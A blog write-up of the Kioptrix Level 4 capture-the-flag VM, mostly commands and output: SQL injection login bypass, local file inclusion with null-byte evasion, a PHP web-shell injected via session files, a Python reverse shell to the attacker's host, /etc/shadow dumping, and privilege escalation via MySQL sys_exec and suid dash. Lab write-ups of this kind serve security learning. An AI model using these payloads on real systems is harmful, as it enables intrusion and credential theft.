---
layout: post
title: "Kioptrix: Level 4"
date: 2015-08-25 18:18:32 +0200
comments: true
categories: [vulnhub, kioptrix]
---
Image: [Kioptrix: Level 1.3 (#4)](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/#)

Nmap output:
{% codeblock %}
root@kali32:~# nmap 192.168.80.154 -sT

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-04-26 23:39 CEST
Nmap scan report for 192.168.80.154
Host is up (0.0015s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:53:2F:A3 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds
{% endcodeblock %}

There is a member login on the http://192.168.80.154/index.php site, we try the
following credentials (SQLi): 

{% codeblock %}
Username: Administrator
Password: test' or '1'='1
{% endcodeblock %}

We logged into member site and after a few seconds found the local file
inclusion vulnerability. Filtering the `etc` string could be easily evaded for displaying `/etc/passwd`:

{% codeblock %}
http://192.168.80.154/member.php?username=robert
http://192.168.80.154/member.php?username=../../../../../etc/passwd -> User ../../../../..//passwd
http://192.168.80.154/member.php?username=../../../../../eetct/passwd -> User ../../../../../et/passwd
http://192.168.80.154/member.php?username=../../../../../eetctc/passwd -> /../../../../../etc/passwd.php
http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00
{% endcodeblock %}

{% codeblock %}
root@kali32:~# curl "http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/kshell
robert:x:1002:1002:,,,:/home/robert:/bin/kshell
{% endcodeblock %}

`smbmap` output reveals:
{% codeblock %}
root@kali32:~# smbmap -H 192.168.80.154
[+] Finding open SMB ports....
[+] User SMB session establishd on 192.168.80.154...
[+] IP: 192.168.80.154:445	Name: 192.168.80.154
	Disk                                                  	Permissions
	----                                                  	-----------
	print$                                            	NO ACCESS
	IPC$                                              	NO ACCESS
{% endcodeblock %}

Now we try to inject php backdoor. For this purpose, we use our session file.
The file has a fixed location `/var/lib/php5/sess_` with the appended session
cookie name:
{% codeblock %}
http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00

myusername|s:13:"Administrator";mypassword|s:15:"test' or '1'='1"; 
{% endcodeblock %}

As we can see, the myusername session variable could be used to easily inject our code:

We need to login using these credentials:
{% codeblock %}
Username: <?php system($_REQUEST[cmd]); ?>
Password: test' or '1'='1
{% endcodeblock %}

Now we have a backdoor, that uses parameter `cmd`. Digging deeper, we use python to execute reverse shell:
{% codeblock %}
root@kali32:~# curl "http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&cmd=id"
myusername|s:32:"uid=33(www-data) gid=33(www-data) groups=33(www-data)
";mypassword|s:15:"test' or '1'='1";

root@kali32:~# curl "http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&cmd=cat%20database.sql"
myusername|s:32:"CREATE TABLE `members` (
`id` int(4) NOT NULL auto_increment,
`username` varchar(65) NOT NULL default '',
`password` varchar(65) NOT NULL default '',
PRIMARY KEY (`id`)
) TYPE=MyISAM AUTO_INCREMENT=2 ;

--
-- Dumping data for table `members`
--

INSERT INTO `members` VALUES (1, 'john', '1234');
";mypassword|s:15:"test' or '1'='1";

root@kali32:/var/www/html# nc -l -p 1234
/bin/sh: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

root@kali32:~# curl "http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&cmd=python+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.80.137\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\[\"/bin/sh\",\"-i\"\]);'"

$ cat checklogin.php
<?php
ob_start();
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name

// Connect to server and select databse.
mysql_connect("$host", "$username", "$password")or die("cannot connect");
mysql_select_db("$db_name")or die("cannot select DB");

// Define $myusername and $mypassword
$myusername=$_POST['myusername'];
$mypassword=$_POST['mypassword'];

// To protect MySQL injection (more detail about MySQL injection)
$myusername = stripslashes($myusername);
//$mypassword = stripslashes($mypassword);
$myusername = mysql_real_escape_string($myusername);
//$mypassword = mysql_real_escape_string($mypassword);

//$sql="SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'";
$result=mysql_query("SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'");
//$result=mysql_query($sql);

// Mysql_num_row is counting table row
$count=mysql_num_rows($result);
// If result matched $myusername and $mypassword, table row must be 1 row

if($count!=0){
// Register $myusername, $mypassword and redirect to file "login_success.php"
	session_register("myusername");
	session_register("mypassword");
	header("location:login_success.php?username=$myusername");
}
else {
echo "Wrong Username or Password";
print('<form method="link" action="index.php"><input type=submit value="Try Again"></form>');
}

ob_end_flush();
?>
{% endcodeblock %}

Because the mysql instance is running as root user, we have a full access to
the database. We dump it and use the credentials for ssh login, for example
with the user `john`. The `lshell` is executed, but noticing his `.lhistory` file,
bash could be directly executed too. Finally, we set the suid privileges for
`dash` using mysql and obtain the root privileges:

{% codeblock %}
$ echo "select * from members" | mysql -u root members
id	username	password
1	john	MyNameIsJohn
2	robert	ADGAdsafdfwt4gadfga==

$ cat /home/john/.lhistory
?
help
echo os.system('/bin/bash')
exit
su
sudo
?
scp
touch hello
help
ls /root
exit
echo os.system('/bin/bash')
exit

root@kali32:~# ssh -l john 192.168.80.154
john@192.168.80.154's password:
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)

john:~$ mysql -u root

mysql> select sys_exec('cat /etc/shadow > /tmp/a');
+--------------------------------------+
| sys_exec('cat /etc/shadow > /tmp/a') |
+--------------------------------------+
| NULL                                 |
+--------------------------------------+
1 row in set (0.01 sec)

mysql>
[1]+  Stopped                 mysql -u root
john@Kioptrix4:~$ cat /tmp/a
root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:0:99999:7:::
daemon:*:15374:0:99999:7:::
bin:*:15374:0:99999:7:::
sys:*:15374:0:99999:7:::
sync:*:15374:0:99999:7:::
games:*:15374:0:99999:7:::
man:*:15374:0:99999:7:::
lp:*:15374:0:99999:7:::
mail:*:15374:0:99999:7:::
news:*:15374:0:99999:7:::
uucp:*:15374:0:99999:7:::
proxy:*:15374:0:99999:7:::
www-data:*:15374:0:99999:7:::
backup:*:15374:0:99999:7:::
list:*:15374:0:99999:7:::
irc:*:15374:0:99999:7:::
gnats:*:15374:0:99999:7:::
nobody:*:15374:0:99999:7:::
libuuid:!:15374:0:99999:7:::
dhcp:*:15374:0:99999:7:::
syslog:*:15374:0:99999:7:::
klog:*:15374:0:99999:7:::
mysql:!:15374:0:99999:7:::
sshd:*:15374:0:99999:7:::
loneferret:$1$/x6RLO82$43aCgYCrK7p2KFwgYw9iU1:15375:0:99999:7:::
john:$1$H.GRhlY6$sKlytDrwFEhu5dULXItWw/:15374:0:99999:7:::
robert:$1$rQRWeUha$ftBrgVvcHYfFFFk6Ut6cM1:15374:0:99999:7:::
john@Kioptrix4:/etc/samba$

mysql> select sys_exec('chmod +s /bin/dash');
+--------------------------------+
| sys_exec('chmod +s /bin/dash') |
+--------------------------------+
| NULL                           |
+--------------------------------+
1 row in set (0.01 sec)

john@Kioptrix4:~$ /bin/dash
# id
uid=1001(john) gid=1001(john) euid=0(root) egid=0(root) groups=1001(john)

# cd /root
# cat congrats.txt
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret
{% endcodeblock %}

Because the UDF exploitation is well known for sqlmap, we could solve the challenge also using this tool:

{% codeblock %}
root@kali32:~# sqlmap -u http://192.168.80.154/checklogin.php --data="myusername=a&mypassword=a&Submit=Login" --os-cmd 'id' --batch | grep uid
command standard output:    'uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)'

root@kali32:~# sqlmap -u http://192.168.80.154/checklogin.php --data="myusername=a&mypassword=a&Submit=Login" --os-cmd 'cat /root/congrats.txt' --batch
...
[00:13:06] [INFO] the backdoor has been successfully uploaded on '/var/www/' - http://192.168.80.154:80/tmpbborl.php
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output:
---
Congratulations!
You've got root.
...
{% endcodeblock %}
